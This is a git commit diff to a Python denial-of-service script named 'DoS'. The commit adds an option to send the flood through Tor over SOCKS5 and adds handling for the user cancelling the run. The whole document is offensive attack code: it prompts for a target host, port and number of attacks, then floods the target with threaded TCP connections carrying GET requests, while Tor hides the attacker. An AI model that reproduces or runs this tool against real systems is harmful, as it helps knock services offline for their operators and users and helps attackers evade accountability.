c9ad4ec2867784e2fa5ba8e7a9499b949be610ab
Bingxuan Ying <yingbingxuan@gmail.com>
2020-09-24 22:59:13 -0700

    Add useTor and user terminate

--- main.py
+++ main.py
@@ -1,34 +1,46 @@
-import threading
 import concurrent.futures
 import socket
-
+import socks
 import time
 from datetime import datetime
 
 
 class DoS:
-    def __init__(self, host, port, nThreads):
+    def __init__(self, host, port, nThreads, useTor):
+        # Target Info
         self.host = host
         self.port = port
-
+        # Num of Attacks
         self.nThreads = nThreads
         self.threads = []
-
+        # Tor
+        self.useTor = useTor
+        self.TPS = 0
+        self.Delimiter = 2000
+        # Message
         self.message = "GET /" + self.host + " HTTP/1.1\r\n"
 
-    def Zombie(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # try:
-        #     s.connect((self.host, self.port))
-        #     s.send(self.message.encode("ascii"))  # TCP Attack
-        #     s.sendto(self.message.encode("ascii"),
-        #              (self.host, self.port))  # UDP Attack
-        # except:
-        #     print("err")
-        #     pass
+        if self.useTor:
+            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
 
-        s.connect((self.host, self.port))
-        s.send(self.message.encode("ascii"))  # TCP Attack
+    def Zombie(self):
+        if self.useTor:
+            s = socks.socksocket()
+        else:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        try:
+            s.connect((self.host, self.port))
+            s.send(self.message.encode("ascii"))  # TCP Attack
+            s.sendto(self.message.encode("ascii"),
+                     (self.host, self.port))  # UDP Attack
+        except socket.error as err:
+            print("[-] Error Message: " + err)
+            pass
+        except KeyboardInterrupt:
+            print("[-] Canceled By User")
+            exit("[-] Canceled By User")
+
         s.close()
 
     def Attack(self):
@@ -37,14 +49,28 @@ class DoS:
 
 
 if __name__ == "__main__":
+    print("\n==============================")
+    print("       Ping Target")
+    print("==============================")
+    Tor = input('[?] Did you want to use Tor (Y/N): ').lower()
     host = input("[*] Enter Target Host Address: ")
     port = int(input("[*] Enter Target Port to Attack: "))
     threads = int(input("[*] Enter number of Attacks: "))
 
-    DoS = DoS(host, port, threads)
+    hostip = socket.gethostbyname(host)
+    useTor = True if Tor == 'y' else False
 
-    print("\nHost %s" % (host))
-    print("\n\n[*] Starting The Attack At %s..." % (time.strftime("%H:%M:%S")))
+    DoS = DoS(host, port, threads, useTor)
+
+    print("\n==============================")
+    print("       Target Info")
+    print("==============================")
+    print("Host {} && IP {}".format(host, hostip))
+
+    print("\n==============================")
+    print("       Launching Attack")
+    print("==============================")
+    print("[#] Starting The Attack At {} ...".format(time.strftime("%H:%M:%S")))
     start_time = datetime.now()
 
     DoS.Attack()
@@ -52,5 +78,5 @@ if __name__ == "__main__":
     end_time = datetime.now()
     total_time = end_time - start_time
 
-    print("\n[*] The Attack Was Done At %s..." % (time.strftime("%H:%M:%S")))
-    print("[*] Total Attack Time %s..." % (total_time))
+    print("[#] The Attack Was Done At {} ...".format(time.strftime("%H:%M:%S")))
+    print("[#] Total Attack Time {}".format(total_time))
